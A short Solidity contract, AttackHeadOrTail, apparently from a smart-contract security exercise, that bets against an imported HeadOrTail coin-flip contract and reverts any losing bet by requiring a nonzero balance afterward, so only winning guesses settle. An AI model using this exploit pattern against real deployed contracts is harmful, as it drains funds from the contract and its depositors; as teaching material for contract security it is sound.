// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./HeadOrTail.sol";

contract AttackHeadOrTail {
    HeadOrTail c;

    constructor(HeadOrTail _contractAddress) {
        c = HeadOrTail(_contractAddress);
    }

    function attack(bool _guess) public payable {
        c.guess{value: msg.value}(_guess);
        require(address(this).balance != 0);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
